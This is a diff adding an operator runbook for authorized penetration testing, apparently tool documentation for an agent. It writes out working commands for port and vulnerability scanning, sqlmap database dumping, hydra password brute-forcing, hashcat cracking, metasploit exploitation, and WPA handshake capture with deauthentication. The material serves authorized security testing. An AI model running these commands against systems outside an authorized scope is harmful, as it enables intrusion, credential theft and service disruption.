@@ -151,3 +151,147 @@ SCOPE.md when it lists targets:
 - `c2` — orchestrate a Sliver C2 (listener / generate beacon / sessions / exec) for authorized adversary emulation. Standard framework only; no custom implants or evasion. Live interactive control belongs in sliver-client.
 Discipline: no mass targeting, no persistence, no evasion. Every finding = reproducible
 evidence. Re-check scope before exploit/post-ex/wifi steps.
+
+## runbook — how the tools connect (authorized engagements only)
+This is the operator runbook: how to find vulnerabilities and capture handshakes,
+and how each tool feeds the next. Everything here assumes a target you own or are
+authorized to test, recorded in SCOPE.md. The structured seat tools (recon,
+nuclei, wpscan, wp_vulnscan, vuln_check, msf, bruteforce, crack, postexploit,
+wifi_capture, wifi_crack, c2) wrap these commands behind the authorization gate;
+the raw commands below are what they run and what you'd run by hand.
+
+The chain, end to end:
+  recon (find hosts/domains) -> enum (map each service) -> vuln (find weaknesses)
+  -> exploit (prove impact) -> loot/report. Wireless is its own chain:
+  capture -> convert -> crack. Web is: fingerprint -> discover -> scan -> confirm.
+
+Data flows by file: one tool's output is the next tool's input.
+  subfinder -> httpx -> nuclei         (subdomains -> live hosts -> vuln scan)
+  nmap -oA -> feed services to enum     (ports -> targeted enumeration)
+  hcxdumptool -> hcxpcapngtool -> hashcat   (capture -> hash -> crack)
+  wpscan/searchsploit -> msf            (version -> matching exploit module)
+
+## chaining — worked pipelines
+Web app, own site:
+  subfinder -silent -d DOMAIN | httpx -silent -title -tech-detect > live.txt
+  nuclei -l live.txt -severity critical,high -o findings.txt
+  ffuf -u https://SITE/FUZZ -w wordlist -mc 200,301,403 -o content.json
+  # anything interesting -> confirm by hand (Burp Repeater) -> record with `finding`
+WordPress, own site:
+  wp_vulnscan {url}                       # passive: components + outdated
+  wpscan --url URL --enumerate vp,vt,u,cb,dbe --api-token TOK   # active + CVEs
+  vuln_check {slug:"<plugin>", version:"<v>"}   # confirm a specific CVE
+Network host:
+  nmap -sV -sC -oA scan TARGET            # -oA writes scan.{nmap,gnmap,xml}
+  searchsploit <service> <version>        # version -> public exploit
+  # validate scope + blast radius, then msf or a manual PoC
+Wireless, own AP: see the `handshake` section.
+
+## nmap — port & service discovery
+Install: apt install nmap. Core:
+  nmap -sV -sC -p- -oA out TARGET    # all ports, version + default scripts, save all formats
+  nmap -sV --top-ports 1000 TARGET   # faster, common ports
+  nmap --script vuln TARGET          # NSE vuln scripts (noisy)
+  nmap -sn 10.0.0.0/24               # host discovery only (ping sweep)
+Flags: -sV service/version, -sC default scripts, -p- all 65535, -oA basename
+(saves .nmap/.gnmap/.xml — the .xml feeds other tools), -T4 faster, -Pn skip host
+discovery. Read the .nmap for the service map; that map drives enum.
+
+## nuclei — templated vulnerability scanning (highest signal for web)
+Install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest, then
+`nuclei -update-templates`. Core:
+  nuclei -u https://TARGET                       # single URL
+  nuclei -l live.txt                             # a list from httpx
+  nuclei -u URL -tags wordpress,cve -severity critical,high
+  nuclei -u URL -t /path/to/templates            # custom template dir
+WordPress CVE coverage without a WPScan token: clone topscoder/nuclei-wordfence-cve
+and point at it: nuclei -u URL -t /path/to/nuclei-wordfence-cve (or set
+SYGNIF_PY_NUCLEI_EXTRA_TEMPLATES so the `nuclei` seat tool includes it). Templates
+ARE effectively a runnable CVE database; keep them updated. Confirm every hit.
+
+## wpscan — WordPress enumeration
+Install: gem install wpscan (or apt). Free CVE data needs a token from wpscan.com/api.
+  wpscan --url https://SITE --enumerate vp,vt,u,cb,dbe --api-token TOK --random-user-agent
+vp=vulnerable plugins, vt=vulnerable themes, u=users, cb=config backups, dbe=db
+exports. Add --plugins-detection aggressive to find hidden plugins (louder). User
+enum feeds a password test; outdated plugin+CVE is the usual finding. Passive
+alternative that needs no install: the `wp_vulnscan` seat tool.
+
+## ffuf — content & parameter discovery
+Install: go install github.com/ffuf/ffuf/v2@latest. Core:
+  ffuf -u https://SITE/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403
+  ffuf -u https://SITE/FUZZ -w list -e .php,.bak,.zip,.sql -mc all -fc 404
+  ffuf -u 'https://SITE/?FUZZ=1' -w params.txt -fs 0     # parameter discovery, filter by size
+FUZZ is the injection point. -mc match codes, -fc filter codes, -fs filter size,
+-recursion. Finds .git/.env/backups/admin panels -> a live one is a real finding.
+Wordlists: the seclists package (/usr/share/seclists).
+
+## sqlmap — SQL injection (your own parameters only)
+Install: apt install sqlmap. Core:
+  sqlmap -u 'https://SITE/page?id=1' --batch            # detect
+  sqlmap -u '...' --batch --dbs                          # list databases
+  sqlmap -u '...' -D dbname --tables                     # then --dump
+  sqlmap -r request.txt --batch                          # from a saved Burp request
+--batch = no prompts, --level/--risk raise depth (and noise), --dump extracts.
+Only against parameters you are authorized to test.
+
+## hydra — online credential testing (loud; can lock accounts)
+Install: apt install hydra. Core:
+  hydra -L users.txt -P passwords.txt ssh://TARGET
+  hydra -l admin -P pass.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'
+  hydra -L users -P pass TARGET -s 443 https-get /admin
+-L userlist / -l single user, -P passlist / -p single pass, -t threads (keep low,
+4), -f stop on first hit. The http-post-form spec is path:body:failure-string.
+Authorized + rate-agreed only — this is noisy and locks accounts.
+
+## hashcat — offline hash cracking (GPU)
+Install: apt install hashcat. Core:
+  hashcat -m MODE hashes.txt wordlist.txt              # dictionary
+  hashcat -m MODE hashes.txt wordlist -r rules/best64.rule    # + rules
+  hashcat -m MODE hashes.txt -a 3 '?d?d?d?d?d?d?d?d'   # mask/brute
+Modes: 22000 = WPA-PBKDF2-PMKID+EAPOL (wifi), 0 = MD5, 100 = SHA1, 1000 = NTLM,
+1800 = sha512crypt, 3200 = bcrypt. -a 0 dictionary, -a 3 mask. Wordlist:
+/usr/share/wordlists/rockyou.txt. `hashcat --show hashes.txt` prints cracked ones.
+
+## metasploit — exploitation framework
+Install: apt install metasploit-framework. Non-interactive (what the `msf` tool does):
+  msfconsole -q -x "use MODULE; set RHOSTS TARGET; set LHOST me; run; exit"
+Discover: search TYPE PRODUCT; info MODULE; show options. Validate the module,
+its blast radius, and that the target is in scope BEFORE run. Prefer auxiliary/
+scanner and check actions first; least-destructive proof. msfvenom builds payloads
+(authorized engagements only). Capture the exact module+options+output as evidence.
+
+## handshake — WPA/WPA2/WPA3 capture and crack (your own network)
+Only against a network you own or are explicitly authorized to test. Chain, per the
+hcxdumptool README: hcxdumptool -> hcxpcapngtool -> hashcat. The capture tool and
+the converter versions MUST match, and the Wi-Fi adapter must support monitor mode
+AND frame injection (many built-in Intel/Broadcom chips do not; use a known-good
+external adapter, e.g. an Atheros/Ralink/MediaTek that supports it).
+1. Monitor mode:
+     sudo ip link set wlan0 down; sudo iw dev wlan0 set type monitor; sudo ip link set wlan0 up
+   (or: airmon-ng start wlan0  ->  wlan0mon)
+2. Capture (PMKID + EAPOL). Modern hcxdumptool 6.3.x:
+     sudo hcxdumptool -i wlan0 -w capture.pcapng -F
+   Older 6.2.x used --enable_status and --filterlist_ap/--filtermode to target one
+   BSSID — flags DRIFT between versions, so check `hcxdumptool --help` on the box.
+   Alternative with the aircrack suite (targets one AP + channel):
+     sudo airodump-ng -c CHANNEL --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
+   PMKID needs no client; a 4-way handshake needs a client to (re)associate —
+   aireplay-ng -0 (deauth) forces it, only on your own AP.
+3. Convert to a hashcat-crackable hash (hcxtools):
+     hcxpcapngtool -o hash.22000 capture.pcapng
+4. Crack offline:
+     hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
+The seat tools wifi_capture (step 2) and wifi_crack (steps 3-4) wrap this behind
+the authorization gate. WPA3-SAE resists this; it applies to WPA/WPA2 (and WPA2/3
+transition mode).
+
+## osint — passive intelligence before you touch anything
+  theHarvester -d DOMAIN -b all                 # emails, hosts, names
+  subfinder -silent -d DOMAIN                    # subdomains (passive)
+  amass enum -passive -d DOMAIN                  # deeper passive subdomains
+  dig TXT DOMAIN; dig TXT _dmarc.DOMAIN          # SPF/DKIM/DMARC (mail spoofing)
+  curl -s 'https://crt.sh/?q=%25.DOMAIN&output=json'   # certificate transparency
+  whatweb DOMAIN                                  # tech stack
+Passive first means no packets to the target's own infra where possible — build the
+asset map before active scanning. The `recon` seat tool runs the core of this.
